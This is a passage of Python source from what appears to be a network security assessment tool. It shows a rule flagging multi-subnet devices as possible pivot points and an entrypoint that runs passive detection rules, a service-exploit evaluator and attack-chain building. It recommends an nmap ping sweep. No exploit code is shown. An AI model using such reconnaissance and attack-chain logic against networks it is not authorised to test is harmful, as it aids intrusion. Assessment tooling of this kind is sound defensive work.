    """Flag devices seen communicating across multiple subnets — potential pivot points."""
    rule_id = "NET-007"
    name = "Device Visible Across Subnets"
    category = Category.NETWORK_INTEL
    severity = Severity.MEDIUM

    def evaluate(self, ctx: AnalysisContext) -> list[Finding]:
        import ipaddress as _ipaddress
        mac_subnets: dict[str, set[str]] = {}
        for mac, obs_list in ctx.observations_by_mac.items():
            for obs in obs_list:
                raw = _parse_raw_data(obs)
                src_ip = raw.get("src_ip")
                if not src_ip or src_ip == "0.0.0.0":
                    continue
                try:
                    net = str(_ipaddress.ip_network(f"{src_ip}/24", strict=False))
                except ValueError:
                    continue
                mac_subnets.setdefault(mac, set()).add(net)

        affected: list[dict] = []
        for mac, subnets in mac_subnets.items():
            if len(subnets) >= 2:
                dev = ctx.device_map.get(mac)
                affected.append({
                    **((_device_info(dev) if dev else {"mac": mac})),
                    "subnets": sorted(subnets),
                })
        if not affected:
            return []
        return [Finding(
            rule_id=self.rule_id, name=self.name,
            category=self.category, severity=self.severity,
            description=(
                f"{len(affected)} device(s) observed communicating across multiple subnets. "
                "Multi-homed devices can serve as lateral movement pivot points. "
                "Verify these are authorized network infrastructure devices."
            ),
            affected_devices=affected,
            evidence=[f"{a.get('mac', '?')} on {', '.join(a.get('subnets', []))}" for a in affected[:5]],
            tools=[
                ToolRecommendation("Nmap", "nmap -sn 192.168.1.0/24 192.168.10.0/24",
                                   "Verify reachability across subnets"),
            ],
        )]


# Main entrypoint

async def analyze_attack_surface(db: Database, data_dir: Path | None = None,
                                 interface: str | None = None,
                                 attacker_ip: str | None = None,
                                 interface_type: str = "local") -> dict:
    """Run all attack surface analysis rules and return the full report."""
    ctx = await _build_context(db, data_dir, interface=interface, attacker_ip=attacker_ip,
                               interface_type=interface_type)

    all_findings: list[Finding] = []

    # Passive observation rules
    passive_rules = [
        UnencryptedProtocolRule(),
        IoTDefaultCredentialRiskRule(),
        MultiSubnetDeviceRule(),
        LLMNRDetectedRule(),
        NetBIOSDetectedRule(),
        MDNSDetectedRule(),
        WPADDetectedRule(),
        ARPActivityRule(),
        ARPDuplicateIPRule(),
        GratuitousARPRule(),
        DHCPStarvationRiskRule(),
        DHCPAnomalyRule(),
        RouterAdvertisementRule(),
        RoutingProtocolProbeRule(),
        TLSWeakVersionRule(),
        HTTPWithoutTLSRule(),
        UPnPDetectedRule(),
        InternalDNSQueriesRule(),
        MultipleGatewaysRule(),
        NDPSpoofingRiskRule(),
        MACDiversityRule(),
        DiscoveryProtocolRule(),
        MultipleDHCPServersRule(),
        DHCPv6ActivityRule(),
        ICMPRedirectRiskRule(),
        PhantomIPRule(),
        VLANHoppingDTPRule(),
        VLANLeakageRule(),
        STPManipulationRiskRule(),
    ]

    for rule in passive_rules:
        try:
            findings = rule.evaluate(ctx)
            # Hydrate tool placeholders for passive rules
            for f in findings:
                if f.tools:
                    f.tools = _hydrate_tools(f.tools, ctx, f.affected_devices or None)
            all_findings.extend(findings)
        except Exception as exc:
            logger.warning("Rule %s failed: %s", rule.rule_id, exc)

    # Service exploitation rules
    svc_eval = ServiceExploitEvaluator()
    try:
        all_findings.extend(svc_eval.evaluate(ctx))
    except Exception as exc:
        logger.warning("ServiceExploitEvaluator failed: %s", exc)

    # Suppress L2 rules for VPN/proxy/pivot interfaces
    if ctx.interface_type in ("vpn", "proxy", "pivot"):
        all_findings = [f for f in all_findings if not f.rule_id.startswith("L2-")]

    # Apply exclusions
    excluded_ips = {e["value"] for e in ctx.exclusions if e["type"] == "ip"}
    excluded_macs = {e["value"] for e in ctx.exclusions if e["type"] == "mac"}
    excluded_rules = {e["value"] for e in ctx.exclusions if e["type"] == "rule"}

    for f in all_findings:
        if f.rule_id in excluded_rules:
            f.excluded = True
        elif any(dev.get("ip") in excluded_ips or dev.get("mac") in excluded_macs
                 for dev in f.affected_devices):
            f.excluded = True

    # Build attack chains
    chains = build_chains(all_findings, ctx)

    # Build summary
    summary = _build_summary(all_findings, chains)

    return {
        "timestamp": datetime.now().isoformat(),
        "findings": [f.to_dict() for f in all_findings],
        "chains": [c.to_dict() for c in chains],
        "summary": summary,
    }


def _build_summary(findings: list[Finding], chains: list[AttackChain]) -> dict:
    by_severity: dict[str, int] = {}
    by_category: dict[str, int] = {}
    for f in findings:
        by_severity[f.severity] = by_severity.get(f.severity, 0) + 1
        by_category[f.category] = by_category.get(f.category, 0) + 1
    return {
        "total": len(findings),
        "by_severity": by_severity,
        "by_category": by_category,
        "chain_count": len(chains),
    }
